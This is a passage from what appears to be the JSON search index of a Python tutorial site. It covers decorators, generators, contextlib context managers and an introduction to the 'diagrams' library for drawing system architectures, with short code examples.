    "section": "15.3 Function Decorators",
    "text": "15.3 Function Decorators\n\n15.3.1 Creating and Using Function Decorators\nA function decorator is a function that takes another function as an argument and returns a new function that adds some behavior.\ndef decorator(func):\n    def wrapper(*args, **kwargs):\n        print(\"Before the function call\")\n        result = func(*args, **kwargs)\n        print(\"After the function call\")\n        return result\n    return wrapper\n\n@decorator\ndef greet(name):\n    print(f\"Hello, {name}\")\n\ngreet(\"Alice\")\n\n\n15.3.2 Decorating Functions with Arguments\nYou can also create decorators that work with functions that have arguments.\ndef decorator(func):\n    def wrapper(*args, **kwargs):\n        print(f\"Arguments: {args} {kwargs}\")\n        result = func(*args, **kwargs)\n        return result\n    return wrapper\n\n@decorator\ndef add(a, b):\n    return a + b\n\nprint(add(2, 3))\n\n\n15.3.3 Passing Arguments to Decorators\nYou can pass arguments to decorators by adding an extra layer of wrapping.\ndef repeat(num_times):\n    def decorator(func):\n        def wrapper(*args, **kwargs):\n            for _ in range(num_times):\n                result = func(*args, **kwargs)\n            return result\n        return wrapper\n    return decorator\n\n@repeat(3)\ndef say_hello(name):\n    print(f\"Hello, {name}\")\n\nsay_hello(\"Bob\")",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#class-decorators",
    "href": "12_python_adv_concepts.html#class-decorators",
    "title": "13  Advanced Python Concepts",
    "section": "15.4 Class Decorators",
    "text": "15.4 Class Decorators\nClass decorators are similar to function decorators but are used to modify classes.\n\n15.4.1 Basic Class Decorator\ndef class_decorator(cls):\n    class Wrapped(cls):\n        def new_method(self):\n            print(\"New method added by decorator\")\n        cls.new_method = new_method\n    return Wrapped\n\n@class_decorator\nclass MyClass:\n    def method(self):\n        print(\"Original method\")\n\nobj = MyClass()\nobj.method()\nobj.new_method()\n\n\n15.4.2 Using Class Decorators to Modify Methods\nYou can also use class decorators to modify class methods.\ndef method_decorator(method):\n    def wrapper(self, *args, **kwargs):\n        print(\"Before method call\")\n        result = method(self, *args, **kwargs)\n        print(\"After method call\")\n        return result\n    return wrapper\n\ndef class_decorator(cls):\n    cls.method = method_decorator(cls.method)\n    return cls\n\n@class_decorator\nclass MyClass:\n    def method(self):\n        print(\"Original method\")\n\nobj = MyClass()\nobj.method()",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#using-multiple-decorators",
    "href": "12_python_adv_concepts.html#using-multiple-decorators",
    "title": "13  Advanced Python Concepts",
    "section": "15.5 Using Multiple Decorators",
    "text": "15.5 Using Multiple Decorators\nYou can stack multiple decorators on a single function or method.\ndef decorator1(func):\n    def wrapper(*args, **kwargs):\n        print(\"Decorator 1\")\n        return func(*args, **kwargs)\n    return wrapper\n\ndef decorator2(func):\n    def wrapper(*args, **kwargs):\n        print(\"Decorator 2\")\n        return func(*args, **kwargs)\n    return wrapper\n\n@decorator1\n@decorator2\ndef greet(name):\n    print(f\"Hello, {name}\")\n\ngreet(\"Alice\")\nIn this example, decorator2 is applied first, followed by decorator1.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#built-in-decorators",
    "href": "12_python_adv_concepts.html#built-in-decorators",
    "title": "13  Advanced Python Concepts",
    "section": "15.6 Built-in Decorators",
    "text": "15.6 Built-in Decorators\nPython provides several built-in decorators, such as @staticmethod, @classmethod, and @property.\n\n15.6.1 Static Method\nclass MyClass:\n    @staticmethod\n    def static_method():\n        print(\"This is a static method\")\n\nMyClass.static_method()\n\n\n15.6.2 Class Method\nclass MyClass:\n    @classmethod\n    def class_method(cls):\n        print(f\"This is a class method of {cls}\")\n\nMyClass.class_method()\n\n\n15.6.3 Property\nclass MyClass:\n    def __init__(self, value):\n        self._value = value\n\n    @property\n    def value(self):\n        return self._value\n\n    @value.setter\n    def value(self, new_value):\n        if new_value &lt; 0:\n            raise ValueError(\"Value cannot be negative\")\n        self._value = new_value\n\nobj = MyClass(10)\nprint(obj.value)\nobj.value = 20\nprint(obj.value)",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#practical-examples",
    "href": "12_python_adv_concepts.html#practical-examples",
    "title": "13  Advanced Python Concepts",
    "section": "15.7 Practical Examples",
    "text": "15.7 Practical Examples\n\n15.7.1 Logging Decorator\nA logging decorator can be used to log function calls.\nimport logging\n\ndef log(func):\n    def wrapper(*args, **kwargs):\n        logging.info(f\"Running {func.__name__} with {args} and {kwargs}\")\n        return func(*args, **kwargs)\n    return wrapper\n\n@log\ndef multiply(x, y):\n    return x * y\n\nlogging.basicConfig(level=logging.INFO)\nprint(multiply(2, 3))\n\n\n15.7.2 Timing Decorator\nA timing decorator can be used to measure the execution time of a function.\nimport time\n\ndef timing(func):\n    def wrapper(*args, **kwargs):\n        start = time.time()\n        result = func(*args, **kwargs)\n        end = time.time()\n        print(f\"{func.__name__} took {end - start:.4f} seconds\")\n        return result\n    return wrapper\n\n@timing\ndef calculate_sum(n):\n    return sum(range(n))\n\nprint(calculate_sum(1000000))",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#best-practices-1",
    "href": "12_python_adv_concepts.html#best-practices-1",
    "title": "13  Advanced Python Concepts",
    "section": "15.8 Best Practices",
    "text": "15.8 Best Practices\n\nUse functools.wraps: Use functools.wraps to preserve the original function’s metadata when writing decorators.\n\nfrom functools import wraps\n\ndef decorator(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        return func(*args, **kwargs)\n    return wrapper\n\nKeep It Simple: Keep the decorator logic simple and focused on a single responsibility.\nTest Thoroughly: Test decorators thoroughly to ensure they don’t introduce bugs or side effects.\nUse Decorators Judiciously: Avoid overusing decorators; they can make the code harder to understand if used excessively.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#conclusion-2",
    "href": "12_python_adv_concepts.html#conclusion-2",
    "title": "13  Advanced Python Concepts",
    "section": "15.9 Conclusion",
    "text": "15.9 Conclusion\nDecorators are a powerful feature in Python that allows you to extend and modify the behavior of functions and methods. By understanding how to create and use function and class decorators, you can write more modular, reusable, and maintainable code. This tutorial covered the basics of decorators, including practical examples and best practices. With this foundation, you can start exploring more advanced uses of decorators in your Python projects.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#table-of-contents-2",
    "href": "12_python_adv_concepts.html#table-of-contents-2",
    "title": "13  Advanced Python Concepts",
    "section": "16.1 Table of Contents",
    "text": "16.1 Table of Contents\n\nIntroduction to Generators\nCreating Generators\nUsing Generators\nGenerator Expressions\nThe yield Statement\nAdvanced Generator Usage\n\nSending Values to Generators\nThrowing Exceptions into Generators\nClosing Generators\n\nPractical Examples\nComparison with Iterators\nPerformance Considerations\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#introduction-to-generators",
    "href": "12_python_adv_concepts.html#introduction-to-generators",
    "title": "13  Advanced Python Concepts",
    "section": "16.2 Introduction to Generators",
    "text": "16.2 Introduction to Generators\nGenerators provide a way to create iterators in Python. They are written like regular functions but use the yield statement whenever they want to return data. Each call to the generator’s __next__() method (which is implicitly called by the next() function) resumes the function from where it left off (it remembers all the data values and which statement was last executed).",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#creating-generators",
    "href": "12_python_adv_concepts.html#creating-generators",
    "title": "13  Advanced Python Concepts",
    "section": "16.3 Creating Generators",
    "text": "16.3 Creating Generators\n\n16.3.1 Generator Functions\nA generator function is defined like a normal function but uses the yield statement instead of return to return a value. Here’s a simple example:\ndef simple_generator():\n    yield 1\n    yield 2\n    yield 3\n\ngen = simple_generator()\n\nprint(next(gen))  # Output: 1\nprint(next(gen))  # Output: 2\nprint(next(gen))  # Output: 3\n\n\n16.3.2 Generator Expressions\nGenerator expressions provide an easy and concise way to create generators. They are similar to list comprehensions but use parentheses instead of square brackets.\ngen_exp = (x * x for x in range(5))\n\nprint(next(gen_exp))  # Output: 0\nprint(next(gen_exp))  # Output: 1\nprint(next(gen_exp))  # Output: 4",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#using-generators",
    "href": "12_python_adv_concepts.html#using-generators",
    "title": "13  Advanced Python Concepts",
    "section": "16.4 Using Generators",
    "text": "16.4 Using Generators\nGenerators can be iterated over using a for loop, which automatically handles the StopIteration exception.\ndef countdown(n):\n    while n &gt; 0:\n        yield n\n        n -= 1\n\nfor num in countdown(5):\n    print(num)",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#the-yield-statement",
    "href": "12_python_adv_concepts.html#the-yield-statement",
    "title": "13  Advanced Python Concepts",
    "section": "16.5 The yield Statement",
    "text": "16.5 The yield Statement\nThe yield statement is used to produce a value from the generator and pause its execution. The next time __next__() is called, the generator resumes execution immediately after the yield.\n\n16.5.1 Example: Fibonacci Sequence\ndef fibonacci(limit):\n    a, b = 0, 1\n    while a &lt; limit:\n        yield a\n        a, b = b, a + b\n\nfib = fibonacci(10)\nfor num in fib:\n    print(num)",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#advanced-generator-usage",
    "href": "12_python_adv_concepts.html#advanced-generator-usage",
    "title": "13  Advanced Python Concepts",
    "section": "16.6 Advanced Generator Usage",
    "text": "16.6 Advanced Generator Usage\n\n16.6.1 Sending Values to Generators\nYou can send values to a generator using the send() method. This can be useful for coroutines or advanced control flow.\ndef echo():\n    while True:\n        received = yield\n        print(f'Received: {received}')\n\ngen = echo()\nnext(gen)  # Prime the generator\ngen.send('Hello')  # Output: Received: Hello\ngen.send('World')  # Output: Received: World\n\n\n16.6.2 Throwing Exceptions into Generators\nYou can throw exceptions into a generator using the throw() method. This allows you to handle errors within the generator.\ndef generator():\n    try:\n        yield 'Normal execution'\n    except ValueError:\n        yield 'Handling ValueError'\n    yield 'End'\n\ngen = generator()\nprint(next(gen))  # Output: Normal execution\nprint(gen.throw(ValueError))  # Output: Handling ValueError\nprint(next(gen))  # Output: End\n\n\n16.6.3 Closing Generators\nYou can close a generator using the close() method. This raises a GeneratorExit exception inside the generator to perform any cleanup.\ndef generator():\n    try:\n        yield 'Running'\n    finally:\n        print('Closing generator')\n\ngen = generator()\nprint(next(gen))  # Output: Running\ngen.close()  # Output: Closing generator",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#practical-examples-1",
    "href": "12_python_adv_concepts.html#practical-examples-1",
    "title": "13  Advanced Python Concepts",
    "section": "16.7 Practical Examples",
    "text": "16.7 Practical Examples\n\n16.7.1 Reading Large Files\nGenerators can be very useful when reading large files line by line, as they allow you to process each line without loading the entire file into memory.\ndef read_large_file(file_path):\n    with open(file_path) as file:\n        for line in file:\n            yield line\n\nfor line in read_large_file('large_file.txt'):\n    process(line)\n\n\n16.7.2 Infinite Sequences\nGenerators can be used to create infinite sequences.\ndef infinite_sequence():\n    num = 0\n    while True:\n        yield num\n        num += 1\n\nfor i in infinite_sequence():\n    print(i)\n    if i &gt;= 10:\n        break",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#comparison-with-iterators",
    "href": "12_python_adv_concepts.html#comparison-with-iterators",
    "title": "13  Advanced Python Concepts",
    "section": "16.8 Comparison with Iterators",
    "text": "16.8 Comparison with Iterators\nGenerators are a simple way to create iterators. Unlike a regular iterator, which requires you to define __iter__() and __next__(), a generator function does this automatically.\n\n16.8.1 Iterator Class Example\nclass Counter:\n    def __init__(self, low, high):\n        self.current = low\n        self.high = high\n\n    def __iter__(self):\n        return self\n\n    def __next__(self):\n        if self.current &gt; self.high:\n            raise StopIteration\n        else:\n            self.current += 1\n            return self.current - 1\n\ncounter = Counter(1, 5)\nfor num in counter:\n    print(num)\n\n\n16.8.2 Equivalent Generator Example\ndef counter(low, high):\n    current = low\n    while current &lt;= high:\n        yield current\n        current += 1\n\nfor num in counter(1, 5):\n    print(num)",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#performance-considerations",
    "href": "12_python_adv_concepts.html#performance-considerations",
    "title": "13  Advanced Python Concepts",
    "section": "16.9 Performance Considerations",
    "text": "16.9 Performance Considerations\nGenerators can lead to significant performance improvements by reducing memory usage and allowing for lazy evaluation.\n\n16.9.1 Memory Efficiency\nGenerators do not store the entire sequence in memory. Instead, they generate each value on the fly, which is much more memory efficient.\n\n\n16.9.2 Lazy Evaluation\nGenerators are evaluated lazily, meaning they only produce values when needed. This can improve performance, especially for large datasets or infinite sequences.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#best-practices-2",
    "href": "12_python_adv_concepts.html#best-practices-2",
    "title": "13  Advanced Python Concepts",
    "section": "16.10 Best Practices",
    "text": "16.10 Best Practices\n\nUse Generators for Large Datasets: When working with large datasets, use generators to improve memory efficiency.\nKeep Generators Simple: Keep your generator functions simple and focused on a single task.\nUse Generator Expressions: Use generator expressions for simple cases where you would otherwise use a list comprehension.\nHandle Generator Cleanup: Ensure proper cleanup of resources within generators using try/finally blocks or context managers.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#conclusion-3",
    "href": "12_python_adv_concepts.html#conclusion-3",
    "title": "13  Advanced Python Concepts",
    "section": "16.11 Conclusion",
    "text": "16.11 Conclusion\nGenerators are a powerful feature in Python that allow you to work with sequences of data in a memory-efficient and performant way. By using yield, you can create iterators with less code and more readability. Advanced techniques like sending values, throwing exceptions, and closing generators further extend their capabilities. By following best practices and understanding the intricacies of generators, you can write more efficient and elegant Python code.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#table-of-contents-3",
    "href": "12_python_adv_concepts.html#table-of-contents-3",
    "title": "13  Advanced Python Concepts",
    "section": "17.1 Table of Contents",
    "text": "17.1 Table of Contents\n\nIntroduction to Context Managers\nThe contextlib Module\nUsing contextlib.contextmanager\nThe closing Function\nThe suppress Function\nThe redirect_stdout and redirect_stderr Functions\nThe ExitStack Class\nCombining Context Managers\nPractical Examples\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#introduction-to-context-managers",
    "href": "12_python_adv_concepts.html#introduction-to-context-managers",
    "title": "13  Advanced Python Concepts",
    "section": "17.2 Introduction to Context Managers",
    "text": "17.2 Introduction to Context Managers\nA context manager is an object that defines the runtime context to be established when executing a with statement. Common use cases include opening and closing files, acquiring and releasing locks, and establishing and tearing down network connections.\n\n17.2.1 Basic Example\nwith open('example.txt', 'w') as file:\n    file.write('Hello, world!')\nIn this example, the file is automatically closed when the block inside the with statement is exited, even if an exception occurs.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#the-contextlib-module",
    "href": "12_python_adv_concepts.html#the-contextlib-module",
    "title": "13  Advanced Python Concepts",
    "section": "17.3 The contextlib Module",
    "text": "17.3 The contextlib Module\nThe contextlib module provides several utilities to help create and manage context managers. It simplifies the process of writing and using context managers.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#using-contextlib.contextmanager",
    "href": "12_python_adv_concepts.html#using-contextlib.contextmanager",
    "title": "13  Advanced Python Concepts",
    "section": "17.4 Using contextlib.contextmanager",
    "text": "17.4 Using contextlib.contextmanager\nThe contextmanager decorator from the contextlib module allows you to create a context manager using a generator function. This approach is often more readable and concise than creating a class-based context manager.\n\n17.4.1 Example\nfrom contextlib import contextmanager\n\n@contextmanager\ndef open_file(file, mode):\n    f = open(file, mode)\n    try:\n        yield f\n    finally:\n        f.close()\n\nwith open_file('example.txt', 'w') as file:\n    file.write('Hello, world!')\nIn this example, the open_file function is a context manager that ensures the file is properly closed after use.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#the-closing-function",
    "href": "12_python_adv_concepts.html#the-closing-function",
    "title": "13  Advanced Python Concepts",
    "section": "17.5 The closing Function",
    "text": "17.5 The closing Function\nThe closing function is a utility that ensures an object with a close method is closed when the block inside the with statement is exited.\n\n17.5.1 Example\nfrom contextlib import closing\nimport urllib.request\n\nwith closing(urllib.request.urlopen('http://www.example.com')) as page:\n    for line in page:\n        print(line)\nHere, the closing function ensures that the URL connection is properly closed after use.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#the-suppress-function",
    "href": "12_python_adv_concepts.html#the-suppress-function",
    "title": "13  Advanced Python Concepts",
    "section": "17.6 The suppress Function",
    "text": "17.6 The suppress Function\nThe suppress function allows you to suppress specified exceptions within a with statement. This is useful for ignoring specific errors without interrupting the flow of your program.\n\n17.6.1 Example\nfrom contextlib import suppress\n\nwith suppress(FileNotFoundError):\n    open('non_existent_file.txt')\n\nprint('File not found, but no exception was raised.')\nIn this example, the FileNotFoundError is suppressed, so the program continues running without interruption.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#the-redirect_stdout-and-redirect_stderr-functions",
    "href": "12_python_adv_concepts.html#the-redirect_stdout-and-redirect_stderr-functions",
    "title": "13  Advanced Python Concepts",
    "section": "17.7 The redirect_stdout and redirect_stderr Functions",
    "text": "17.7 The redirect_stdout and redirect_stderr Functions\nThe redirect_stdout and redirect_stderr functions allow you to redirect the output of stdout and stderr to another stream, such as a file.\n\n17.7.1 Example\nfrom contextlib import redirect_stdout\n\nwith open('output.txt', 'w') as f:\n    with redirect_stdout(f):\n        print('This will be written to the file.')\n\nprint('This will be written to the console.')\nHere, the print statement inside the with block is redirected to the output.txt file.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#the-exitstack-class",
    "href": "12_python_adv_concepts.html#the-exitstack-class",
    "title": "13  Advanced Python Concepts",
    "section": "17.8 The ExitStack Class",
    "text": "17.8 The ExitStack Class\nThe ExitStack class allows you to dynamically manage a stack of context managers. This is useful when you need to enter and exit multiple context managers in a flexible way.\n\n17.8.1 Example\nfrom contextlib import ExitStack\n\nwith ExitStack() as stack:\n    files = [stack.enter_context(open(f'file{i}.txt', 'w')) for i in range(3)]\n    for i, file in enumerate(files):\n        file.write(f'This is file {i}.')\n\nprint('All files are closed.')\nIn this example, the ExitStack manages multiple file context managers, ensuring they are all properly closed.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#combining-context-managers",
    "href": "12_python_adv_concepts.html#combining-context-managers",
    "title": "13  Advanced Python Concepts",
    "section": "17.9 Combining Context Managers",
    "text": "17.9 Combining Context Managers\nYou can use the ExitStack class to combine multiple context managers into a single with statement.\n\n17.9.1 Example\nfrom contextlib import ExitStack\n\nwith ExitStack() as stack:\n    file1 = stack.enter_context(open('file1.txt', 'w'))\n    file2 = stack.enter_context(open('file2.txt', 'w'))\n    # Perform operations on file1 and file2\n\nprint('Both files are closed.')\nHere, both file1 and file2 are managed by the ExitStack, ensuring they are both properly closed.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#practical-examples-2",
    "href": "12_python_adv_concepts.html#practical-examples-2",
    "title": "13  Advanced Python Concepts",
    "section": "17.10 Practical Examples",
    "text": "17.10 Practical Examples\n\n17.10.1 Creating a Temporary Directory\nimport os\nimport tempfile\nfrom contextlib import contextmanager\n\n@contextmanager\ndef temporary_directory():\n    dirpath = tempfile.mkdtemp()\n    try:\n        yield dirpath\n    finally:\n        os.rmdir(dirpath)\n\nwith temporary_directory() as tempdir:\n    print(f'Temporary directory created at {tempdir}')\n\n\n17.10.2 Timing Code Execution\nimport time\nfrom contextlib import contextmanager\n\n@contextmanager\ndef timer():\n    start = time.time()\n    yield\n    end = time.time()\n    print(f'Time taken: {end - start} seconds')\n\nwith timer():\n    sum([i ** 2 for i in range(10000)])",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#best-practices-3",
    "href": "12_python_adv_concepts.html#best-practices-3",
    "title": "13  Advanced Python Concepts",
    "section": "17.11 Best Practices",
    "text": "17.11 Best Practices\n\nUse contextmanager for Simple Context Managers: Use the contextmanager decorator to create simple context managers using generator functions.\nUse ExitStack for Complex Context Managers: Use the ExitStack class for managing multiple context managers dynamically.\nEnsure Proper Cleanup: Always ensure that resources are properly cleaned up by using try/finally blocks or context managers.\nSuppress Exceptions Sparingly: Use the suppress function sparingly and only when you are sure that ignoring the exception is safe.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "12_python_adv_concepts.html#conclusion-4",
    "href": "12_python_adv_concepts.html#conclusion-4",
    "title": "13  Advanced Python Concepts",
    "section": "17.12 Conclusion",
    "text": "17.12 Conclusion\nThe contextlib module in Python provides a suite of tools for working with context managers, making it easier to manage resources and ensure proper cleanup. By using contextlib.contextmanager, closing, suppress, redirect_stdout, redirect_stderr, and ExitStack, you can write more robust and maintainable code. Understanding and utilizing these tools will help you handle resource management tasks efficiently and effectively in your Python programs.",
    "crumbs": [
      "<span class='chapter-number'>13</span>  <span class='chapter-title'>Advanced Python Concepts</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html",
    "href": "13_python_lib_for_sys_design.html",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "",
    "text": "14.0.1 Creating Architectural Diagrams with diagrams\nThe diagrams library allows you to create system architecture diagrams programmatically. It provides a simple and intuitive way to visualize cloud infrastructure, data flows, and other components.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#table-of-contents",
    "href": "13_python_lib_for_sys_design.html#table-of-contents",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.1 Table of Contents",
    "text": "15.1 Table of Contents\n\nIntroduction to diagrams\nInstallation\nBasic Usage\nCreating Nodes\nConnecting Nodes\nGrouping Nodes\nCustomizing Diagrams\nSupported Providers and Services\nPractical Examples\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#introduction-to-diagrams",
    "href": "13_python_lib_for_sys_design.html#introduction-to-diagrams",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.2 Introduction to diagrams",
    "text": "15.2 Introduction to diagrams\nThe diagrams module simplifies the process of creating visual representations of cloud architectures, network layouts, and other system configurations. It uses a graph description language called Graphviz under the hood to render the diagrams.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#installation",
    "href": "13_python_lib_for_sys_design.html#installation",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.3 Installation",
    "text": "15.3 Installation\nTo install the diagrams module, you need to have Python installed on your system. You can then install it using pip:\npip install diagrams\nAdditionally, you need to have Graphviz installed. Depending on your operating system, you can install it using the following commands:\n\nFor Ubuntu/Debian:\nsudo apt-get install graphviz\nFor macOS:\nbrew install graphviz\nFor Windows:\nDownload and install Graphviz from here.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#basic-usage",
    "href": "13_python_lib_for_sys_design.html#basic-usage",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.4 Basic Usage",
    "text": "15.4 Basic Usage\nCreating a simple diagram with diagrams is straightforward. Here’s a basic example that demonstrates how to create a simple architecture diagram:\nfrom diagrams import Diagram\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\n\nwith Diagram(\"Simple Diagram\", show=False):\n    ELB(\"load balancer\") &gt;&gt; EC2(\"web server\") &gt;&gt; RDS(\"database\")\nThis code snippet creates a simple diagram with a load balancer connected to a web server, which in turn is connected to a database. The show=False parameter is used to prevent the diagram from opening automatically after being generated.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#creating-nodes",
    "href": "13_python_lib_for_sys_design.html#creating-nodes",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.5 Creating Nodes",
    "text": "15.5 Creating Nodes\nNodes represent different components in the diagram. Each node corresponds to a specific service or component from a cloud provider or a generic category. Nodes can be created by importing the appropriate classes from the diagrams module.\n\n15.5.1 Example\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\n\n# Creating nodes\nload_balancer = ELB(\"load balancer\")\nweb_server = EC2(\"web server\")\ndatabase = RDS(\"database\")",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#connecting-nodes",
    "href": "13_python_lib_for_sys_design.html#connecting-nodes",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.6 Connecting Nodes",
    "text": "15.6 Connecting Nodes\nNodes can be connected using the &gt;&gt; operator, which denotes a directional connection between components.\n\n15.6.1 Example\nfrom diagrams import Diagram\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\n\nwith Diagram(\"Web Service\", show=False):\n    ELB(\"load balancer\") &gt;&gt; EC2(\"web server\") &gt;&gt; RDS(\"database\")\nThis creates a diagram where the load balancer is connected to the web server, which is connected to the database.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#grouping-nodes",
    "href": "13_python_lib_for_sys_design.html#grouping-nodes",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.7 Grouping Nodes",
    "text": "15.7 Grouping Nodes\nNodes can be grouped using clusters, which are used to visually organize nodes into logical groups.\n\n15.7.1 Example\nfrom diagrams import Cluster, Diagram\nfrom diagrams.aws.compute import EC2\nfrom diagrams.aws.database import RDS\nfrom diagrams.aws.network import ELB\n\nwith Diagram(\"Grouped Diagram\", show=False):\n    with Cluster(\"Web Cluster\"):\n        web1 = EC2(\"web1\")\n        web2 = EC2(\"web2\")\n        web3 = EC2(\"web3\")\n        \n    load_balancer = ELB(\"load balancer\")\n    database = RDS(\"database\")\n\n    load_balancer &gt;&gt; web1\n    load_balancer &gt;&gt; web2\n    load_balancer &gt;&gt; web3\n    web1 &gt;&gt; database\n    web2 &gt;&gt; database\n    web3 &gt;&gt; database\nIn this example, the web servers are grouped into a cluster called “Web Cluster”.",
    "crumbs": [
      "<span class='chapter-number'>14</span>  <span class='chapter-title'>Introduction to Python Libraries for System Design</span>"
    ]
  },
  {
    "objectID": "13_python_lib_for_sys_design.html#customizing-diagrams-1",
    "href": "13_python_lib_for_sys_design.html#customizing-diagrams-1",
    "title": "14  Introduction to Python Libraries for System Design",
    "section": "15.8 Customizing Diagrams",
